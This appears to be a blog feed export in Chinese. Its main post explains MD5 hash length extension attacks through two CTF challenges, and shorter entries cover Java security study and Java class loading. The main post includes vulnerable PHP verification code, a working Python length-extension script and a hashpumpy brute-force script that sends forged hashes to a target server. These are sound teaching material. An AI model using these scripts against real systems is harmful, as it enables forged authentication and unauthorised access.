    <content><![CDATA[<p>哈希摘要算法，如MD5、SHA1、SHA2等都是基于Merkle-Damgard结构。当知道hash(secret+message)的值及secret长度的情况下，可以轻松推算出hash(secret + message || padding || m’)的值。因为攻击者的hash计算过程，相当于从服务器计算过程的一半紧接着进行下去。当填充后，服务器计算出的原始hash值，正好与添加扩展字符串并覆盖初始链变量所计算出的一样。因此，出现此攻击。</p>
<a id="more"></a>

<h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><ul>
<li>在进行验证时使用 <code>md5(secret+message) === hash</code>进行比较</li>
</ul>
<h1 id="MD5算法流程"><a href="#MD5算法流程" class="headerlink" title="MD5算法流程"></a>MD5算法流程</h1><p><img src="1.png" alt=""><br>根据图，md5的流程分为以下步骤:</p>
<ol>
<li>把消息分为n个消息块。每个消息块512bit。</li>
<li>对最后一个消息进行填充。<ul>
<li>Append Padding Bits(补位)</li>
<li>Append Length(补长度)</li>
</ul>
</li>
<li>每个消息块会和一个链变量做运算，把运算结果作为下一个链变量。初始链变量固定。<ul>
<li><code>A=0x67452301</code></li>
<li><code>B=0xefcdab89</code></li>
<li><code>C=0x98badcfe</code></li>
<li><code>D=0x10325476</code></li>
</ul>
</li>
<li>最后一轮产生的链变量经过高低位互换后就是计算出来的md5值。</li>
</ol>
<h2 id="Append-Padding-Bits-填充bits"><a href="#Append-Padding-Bits-填充bits" class="headerlink" title="Append Padding Bits(填充bits)"></a>Append Padding Bits(填充bits)</h2><p>对最后一个消息块进行补位，使得其长度在对512取模后的值为448。当消息长度不满448bit时，需要在后面加上1，紧跟着多个0(二进制表示)。即16进制中的表示是在后面补上80(10000000)。</p>
<h2 id="Append-Length-填充长度"><a href="#Append-Length-填充长度" class="headerlink" title="Append Length(填充长度)"></a>Append Length(填充长度)</h2><p>剩下的最后8个字节储存量补位之前的消息长度。</p>
<h1 id="长度扩展攻击流程"><a href="#长度扩展攻击流程" class="headerlink" title="长度扩展攻击流程"></a>长度扩展攻击流程</h1><p>其实这个攻击问题就出在覆盖上，每一个消息块与前一个链变量进行一个运算后的结果会覆盖这个链变量的值。由于在这个攻击中获取到了hash(secret+message)的值，这个值是对(secret+message+padding)与链变量进行运算。</p>
<p>若此时在后面附加上消息，只需要对附加消息进行padding。然后与上一轮产生的链变量进行运算后，进行高低位互换就得到了新的hash值。上一轮的链变量正好是hash(secret+message)值高低位变换后的结果。</p>
<p>因此长度扩展攻击需要满足以下条件:</p>
<ul>
<li>消息message可控已知</li>
<li>secret长度已知(可爆破)</li>
<li>基于Merkle-Damgard构造的算法</li>
</ul>
<h2 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h2><p>结合一道题目来方便理解:</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目中，可以得知<code>md5(secret.urldecode(&quot;admin&quot;.&quot;admin&quot;))</code>的值，且secret的值也已知。满足哈子长度扩展攻击的要求。构造如下的payload，首先将原来的padding值附加在后面作为输入。然后在末尾添加附加的message。</p>
<p>找了如下脚本来计算最后的hash值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">F = <span class="keyword">lambda</span> x, y, z: ((x &amp; y) | ((~x) &amp; z))</span><br><span class="line">G = <span class="keyword">lambda</span> x, y, z: ((x &amp; z) | (y &amp; (~z)))</span><br><span class="line">H = <span class="keyword">lambda</span> x, y, z: (x ^ y ^ z)</span><br><span class="line">I = <span class="keyword">lambda</span> x, y, z: (y ^ (x | (~z)))</span><br><span class="line">L = <span class="keyword">lambda</span> x, n: (((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n))) &amp; (<span class="number">0xffffffff</span>))</span><br><span class="line">shi_1 = (<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>) * <span class="number">4</span></span><br><span class="line">shi_2 = (<span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>) * <span class="number">4</span></span><br><span class="line">shi_3 = (<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>) * <span class="number">4</span></span><br><span class="line">shi_4 = (<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>) * <span class="number">4</span></span><br><span class="line">m_1 = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>)</span><br><span class="line">m_2 = (<span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>)</span><br><span class="line">m_3 = (<span class="number">5</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">2</span>)</span><br><span class="line">m_4 = (<span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T</span><span class="params">(i)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> (int(<span class="number">4294967296</span> * abs(math.sin(i)))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(shift_list)</span>:</span></span><br><span class="line">	shift_list = [shift_list[<span class="number">3</span>], shift_list[<span class="number">0</span>], shift_list[<span class="number">1</span>], shift_list[<span class="number">2</span>]]</span><br><span class="line">	<span class="keyword">return</span> shift_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(fun_list, f, m, shi)</span>:</span></span><br><span class="line">	count = <span class="number">0</span></span><br><span class="line">	<span class="keyword">global</span> Ti_count</span><br><span class="line">	<span class="keyword">while</span> count &lt; <span class="number">16</span>:</span><br><span class="line">		xx = int(fun_list[<span class="number">0</span>], <span class="number">16</span>) + f(int(fun_list[<span class="number">1</span>], <span class="number">16</span>), int(fun_list[<span class="number">2</span>], <span class="number">16</span>), int(fun_list[<span class="number">3</span>], <span class="number">16</span>)) + int(m[count], <span class="number">16</span>) + T(Ti_count)</span><br><span class="line">		xx &amp;= <span class="number">0xffffffff</span></span><br><span class="line">		ll = L(xx, shi[count])</span><br><span class="line">		fun_list[<span class="number">0</span>] = hex((int(fun_list[<span class="number">1</span>], <span class="number">16</span>) + ll) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		fun_list = shift(fun_list)</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line">		Ti_count += <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> fun_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_m16</span><span class="params">(order, ascii_list, f_offset)</span>:</span></span><br><span class="line">	ii = <span class="number">0</span></span><br><span class="line">	m16 = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">	f_offset *= <span class="number">64</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">		i *= <span class="number">4</span></span><br><span class="line">		m16[ii] = <span class="string">'0x'</span> + <span class="string">''</span>.join((ascii_list[i + f_offset] + ascii_list[i + <span class="number">1</span> + f_offset] + ascii_list[i + <span class="number">2</span> + f_offset] + ascii_list[i + <span class="number">3</span> + f_offset]).split(<span class="string">'0x'</span>))</span><br><span class="line">		ii += <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> ind <span class="keyword">in</span> range(len(m16)):</span><br><span class="line">		m16[ind] = reverse_hex(m16[ind])</span><br><span class="line">	<span class="keyword">return</span> m16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_hex</span><span class="params">(hex_str)</span>:</span></span><br><span class="line">	hex_str = hex_str[<span class="number">2</span>:]</span><br><span class="line">	<span class="keyword">if</span> len(hex_str) &lt; <span class="number">8</span>:</span><br><span class="line">		hex_str = <span class="string">'0'</span> * (<span class="number">8</span> - len(hex_str)) + hex_str</span><br><span class="line">	hex_str_list = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(hex_str), <span class="number">2</span>):</span><br><span class="line">		hex_str_list.append(hex_str[i:i + <span class="number">2</span>])</span><br><span class="line">	hex_str_list.reverse()</span><br><span class="line">	hex_str_result = <span class="string">'0x'</span> + <span class="string">''</span>.join(hex_str_list)</span><br><span class="line">	<span class="keyword">return</span> hex_str_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_result</span><span class="params">(f_list)</span>:</span></span><br><span class="line">	result = <span class="string">''</span></span><br><span class="line">	f_list1 = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> f_list:</span><br><span class="line">		f_list1[f_list.index(i)] = reverse_hex(i)[<span class="number">2</span>:]</span><br><span class="line">		result += f_list1[f_list.index(i)]</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(input_m, msg_lenth=<span class="number">0</span>)</span>:</span></span><br><span class="line">	ascii_list = list(map(hex, map(ord, input_m)))</span><br><span class="line">	msg_lenth += len(ascii_list) * <span class="number">8</span></span><br><span class="line">	ascii_list.append(<span class="string">'0x80'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(ascii_list)):</span><br><span class="line">		<span class="keyword">if</span> len(ascii_list[i]) &lt; <span class="number">4</span>:</span><br><span class="line">			ascii_list[i] = <span class="string">'0x'</span> + <span class="string">'0'</span> + ascii_list[i][<span class="number">2</span>:]</span><br><span class="line">	<span class="keyword">while</span> (len(ascii_list) * <span class="number">8</span> + <span class="number">64</span>) % <span class="number">512</span> != <span class="number">0</span>:</span><br><span class="line">		ascii_list.append(<span class="string">'0x00'</span>)</span><br><span class="line">	msg_lenth_0x = hex(msg_lenth)[<span class="number">2</span>:]</span><br><span class="line">	msg_lenth_0x = <span class="string">'0x'</span> + msg_lenth_0x.rjust(<span class="number">16</span>, <span class="string">'0'</span>)</span><br><span class="line">	msg_lenth_0x_big_order = reverse_hex(msg_lenth_0x)[<span class="number">2</span>:]</span><br><span class="line">	msg_lenth_0x_list = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(msg_lenth_0x_big_order), <span class="number">2</span>):</span><br><span class="line">		msg_lenth_0x_list.append(<span class="string">'0x'</span> + msg_lenth_0x_big_order[i: i + <span class="number">2</span>])</span><br><span class="line">	ascii_list.extend(msg_lenth_0x_list)</span><br><span class="line">	<span class="keyword">return</span> ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(input_m)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> Ti_count</span><br><span class="line">	Ti_count = <span class="number">1</span></span><br><span class="line">	abcd_list = [<span class="string">'0x67452301'</span>, <span class="string">'0xefcdab89'</span>, <span class="string">'0x98badcfe'</span>, <span class="string">'0x10325476'</span>]</span><br><span class="line">	ascii_list = padding(input_m)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ascii_list) // <span class="number">64</span>):</span><br><span class="line">		aa, bb, cc, dd = abcd_list</span><br><span class="line">		order_1 = gen_m16(m_1, ascii_list, i)</span><br><span class="line">		order_2 = gen_m16(m_2, ascii_list, i)</span><br><span class="line">		order_3 = gen_m16(m_3, ascii_list, i)</span><br><span class="line">		order_4 = gen_m16(m_4, ascii_list, i)</span><br><span class="line">		abcd_list = fun(abcd_list, F, order_1, shi_1)</span><br><span class="line">		abcd_list = fun(abcd_list, G, order_2, shi_2)</span><br><span class="line">		abcd_list = fun(abcd_list, H, order_3, shi_3)</span><br><span class="line">		abcd_list = fun(abcd_list, I, order_4, shi_4)</span><br><span class="line">		output_a = hex((int(abcd_list[<span class="number">0</span>], <span class="number">16</span>) + int(aa, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_b = hex((int(abcd_list[<span class="number">1</span>], <span class="number">16</span>) + int(bb, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_c = hex((int(abcd_list[<span class="number">2</span>], <span class="number">16</span>) + int(cc, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_d = hex((int(abcd_list[<span class="number">3</span>], <span class="number">16</span>) + int(dd, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		abcd_list = [output_a, output_b, output_c, output_d]</span><br><span class="line">		Ti_count = <span class="number">1</span></span><br><span class="line">		print(ascii_list)</span><br><span class="line">	<span class="keyword">return</span> show_result(abcd_list)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_lea</span><span class="params">(suffix, res, len_m)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> Ti_count</span><br><span class="line">	Ti_count = <span class="number">1</span></span><br><span class="line">	abcd_list = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>):</span><br><span class="line">		abcd_list.append(reverse_hex(<span class="string">'0x'</span> + res[i: i + <span class="number">8</span>]))</span><br><span class="line">	ascii_list = padding(suffix, (len_m + <span class="number">72</span>) // <span class="number">64</span> * <span class="number">64</span> * <span class="number">8</span>)  <span class="comment"># len(message + padding) * 8</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ascii_list) // <span class="number">64</span>):</span><br><span class="line">		aa, bb, cc, dd = abcd_list</span><br><span class="line">		order_1 = gen_m16(m_1, ascii_list, i)</span><br><span class="line">		order_2 = gen_m16(m_2, ascii_list, i)</span><br><span class="line">		order_3 = gen_m16(m_3, ascii_list, i)</span><br><span class="line">		order_4 = gen_m16(m_4, ascii_list, i)</span><br><span class="line">		abcd_list = fun(abcd_list, F, order_1, shi_1)</span><br><span class="line">		abcd_list = fun(abcd_list, G, order_2, shi_2)</span><br><span class="line">		abcd_list = fun(abcd_list, H, order_3, shi_3)</span><br><span class="line">		abcd_list = fun(abcd_list, I, order_4, shi_4)</span><br><span class="line">		output_a = hex((int(abcd_list[<span class="number">0</span>], <span class="number">16</span>) + int(aa, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_b = hex((int(abcd_list[<span class="number">1</span>], <span class="number">16</span>) + int(bb, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_c = hex((int(abcd_list[<span class="number">2</span>], <span class="number">16</span>) + int(cc, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		output_d = hex((int(abcd_list[<span class="number">3</span>], <span class="number">16</span>) + int(dd, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">		abcd_list = [output_a, output_b, output_c, output_d]</span><br><span class="line">		Ti_count = <span class="number">1</span></span><br><span class="line">	<span class="comment"># print(ascii_list)</span></span><br><span class="line">	<span class="keyword">return</span> show_result(abcd_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	print(md5_lea(<span class="string">'kingkk'</span>,<span class="string">'571580b26c65f306376d4f64e53cb5c7'</span>,<span class="number">15</span>))</span><br></pre></td></tr></table></figure>

<h2 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h2><p>这是另一道哈希扩展长度的题目。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;CTF Web_SimplestHASH&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myfile = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$flag = fread($myfile,filesize(<span class="string">"flag.txt"</span>));</span><br><span class="line">fclose($myfile);</span><br><span class="line">$salt = <span class="number">0xfffff</span> &amp; (ord(md5($flag, <span class="keyword">TRUE</span>)[<span class="number">1</span>]));</span><br><span class="line">$myfile = fopen(<span class="string">"pswrecord"</span>, <span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">$tmp = fread($myfile,filesize(<span class="string">"pswrecord"</span>));</span><br><span class="line">sscanf($tmp,<span class="string">"%s\t%s"</span>,$name,$password);</span><br><span class="line">$hah = md5($flag.$password.$salt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_string($_POST[<span class="string">"name"</span>]) &amp;&amp;  $_POST[<span class="string">"name"</span>] == $name)&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_string($_POST[<span class="string">"password"</span>]) &amp;&amp; is_string($_POST[<span class="string">"hah"</span>]) &amp;&amp; strlen($_POST[<span class="string">"password"</span>]) &gt;= <span class="number">20</span> &amp;&amp; strlen($_POST[<span class="string">"hah"</span>])  == <span class="number">32</span> &amp;&amp; md5($flag.$_POST[<span class="string">"password"</span>].$salt) == $_POST[<span class="string">'hah'</span>])&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose($myfile);</span><br><span class="line">$_POST[<span class="string">'name'</span>] = <span class="number">0</span>;</span><br><span class="line">$_POST[<span class="string">'hah'</span>] = <span class="number">0</span>;</span><br><span class="line">$_POST[<span class="string">"password"</span>] = <span class="number">0</span>;</span><br><span class="line">$salt = <span class="number">0</span>;</span><br><span class="line">$tmp = <span class="number">0</span>;</span><br><span class="line">$flag = <span class="number">0</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">	&lt;img src=<span class="string">"/welcome.png"</span> alt=<span class="string">"welcome!"</span> /&gt;</span><br><span class="line">	We used git.</span><br><span class="line">	&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">	Name: &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span>&gt;</span><br><span class="line">	Password: &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">	&lt;input type=<span class="string">"password"</span> name=<span class="string">"hah"</span> value=<span class="string">"&lt;?php echo $hah?&gt;"</span> hidden&gt;</span><br><span class="line">	&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Login"</span>&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这道题中，可以获取password值为123456。因此，它有如下条件:</p>
<ul>
<li>hash(flag.password.salt)的值确定</li>
<li>flag的长度不知，salt为0～255之间的值</li>
<li>password为123456</li>
</ul>
<p>看起来似乎差了flag的长度和salt值，实际上这可以通过爆破来求出flag的值以及salt的值。</p>
<p>利用hashpumpy工具直接编写脚本，十分方便。</p>
<ul>
<li><a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">HashPump</a></li>
<li>python <code>pip install hashpumpy</code></li>
</ul>
<p>脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        x, y = hashpumpy.hashpump(<span class="string">'e23879e9135448a6b42f7843a7aeb940'</span>, <span class="string">'123456'</span> + str(j), <span class="string">'ananaskr'</span> + str(j), i)</span><br><span class="line">        data = &#123;<span class="string">"name"</span>: <span class="string">"admin"</span>, <span class="string">"password"</span>: y[:-len(str(j))], <span class="string">"hah"</span>: x&#125;</span><br><span class="line">        req = requests.post(data=data, url=<span class="string">'http://xx.xx.xx.xx:31016'</span>)</span><br><span class="line">        <span class="keyword">if</span> len(req.text) != <span class="number">478</span>:</span><br><span class="line">            print(req.text)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://seaii-blog.com/index.php/2017/05/12/56.html" target="_blank" rel="noopener">hash长度扩展攻击研究</a></li>
<li><a href="https://xz.aliyun.com/t/2563#toc-5" target="_blank" rel="noopener">哈希长度拓展攻击(Hash Length Extension Attacks)</a></li>
</ul>
]]></content>
      <categories>
        <category>密码攻击</category>
      </categories>
  </entry>
  <entry>
    <title>Ripstech Java Security 2019 Calendar复现系列</title>
    <url>/2020/04/30/java-calendar-2019/</url>
    <content><![CDATA[<p>为了了解java安全，也算是入门一下java安全，把Ripstech上的2019 Java Calendar复现了一遍。</p>
<a id="more"></a>
<p>具体分析发表在了先知社区。</p>
<p><a href="https://xz.aliyun.com/t/7098" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(一)</a><br><a href="https://xz.aliyun.com/t/7162" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(二)</a><br><a href="https://xz.aliyun.com/t/7206" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(三)</a><br><a href="https://xz.aliyun.com/t/7247" target="_blank" rel="noopener">Ripstech Java Security 2019 Calendar复现系列(四)</a>  </p>
<p>环境放在了<a href="https://github.com/ananaskr/Java_Calendar_2019" target="_blank" rel="noopener">github</a>上。</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
  </entry>
  <entry>
    <title>JAVA反序列化有关基础知识</title>
    <url>/2020/04/29/java-basic/</url>
    <content><![CDATA[<p>这篇文章主要是记录在学习Java安全过程中需要用到的重要的知识点。</p>
<a id="more"></a>

<h1 id="Java类加载"><a href="#Java类加载" class="headerlink" title="Java类加载"></a>Java类加载</h1><p>Java虚拟机把描述类的数据从Class文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这就是虚拟机的加载机制。查找并加载类的虚拟机需要完成以下三件事情:</p>
<p>1) 通过一个类的全限定名称在获取定义此类的二进制字节流<br>2）将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构<br>3）在java堆中生成一个代表这个类的java.lang.Class对象，作为方法去这些数据的访问入口。  </p>
<blockquote>
<p>对于任何一个类，都需要由加载它的类加载器和这个类来确立其在JVM中的唯一ing。也就是说，两个类来源于同一个Class文件，并且被同一个类加载器加载，这两个类才相等。</p>
</blockquote>
<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>当JVM启动时，会形成由3个类加载器组成的初始类加载器层次结构。</p>
<ul>
<li>Bootstrap ClassLoader: 根类加载器</li>
<li>Extension ClassLoader: 扩展类加载器</li>
<li>System ClassLoader: 系统类加载器</li>
</ul>
<p>自定义类加载器，只需要继承<code>java.lang.ClassLoader</code>类，并重写其<code>findClass()</code>方法即可。java.lang.ClassLoader类的基本职责就是根据一个指定的类的名称，找到或者生成其对应的字节码，然后从这些字节码中定义出一个Java类，即java.lang.Class类的一个实例。ClassLoader类中的相关方法如下:</p>
<ul>
<li>getParent()</li>
<li>loadClass()</li>
<li>findClass()</li>
<li>findLoadedClass()</li>
<li>resolveClass()</li>
<li>defineClass() 将字节码转换为Class对象</li>
</ul>
<h2 id="动态加载Jar"><a href="#动态加载Jar" class="headerlink" title="动态加载Jar"></a>动态加载Jar</h2><p>Java中动态加载jar的方式比较简单</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL[] urls = <span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">"file:libs/jar1.jar"</span>)&#125;;</span><br><span class="line">URLClassloader loader = <span class="keyword">new</span> URLClassLoader(urls,parentLoader);</span><br></pre></td></tr></table></figure>

<h1 id="Javassit"><a href="#Javassit" class="headerlink" title="Javassit"></a>Javassit</h1><p>Javassist是一个Java库，提供了一种操作应用程序的<font color=#008000>Java字节码</font>的方法。Java字节码以二进制的形势存储在class文件中，每个class文件包含一个Java类或接口。</p>
<p>其中<font color=#008000>Javassist.CtClass</font>类表示class文件。如何获取一个CtClass类对象呢？</p>
<p>首先获取一个<font color=#008000>ClassPool</font>对象。它是CtClass对象的容器，按指定条件读取类文件来构造CtClass对象。</p>
<h2 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h2><p>ClassPool是一个存储CtClass的Hash表，类名为key,CtClass对象为value。</p>
<h3 id="获取搜索路径"><a href="#获取搜索路径" class="headerlink" title="获取搜索路径"></a>获取搜索路径</h3><p>ClassPool.getDfault()获取到的是JVM的类搜索路径。当存在tomcat这样的web服务时，它使用多个类加载器作为系统类加载器。在这种情况下，ClassPool需要添加额外的类搜索路径。</p>
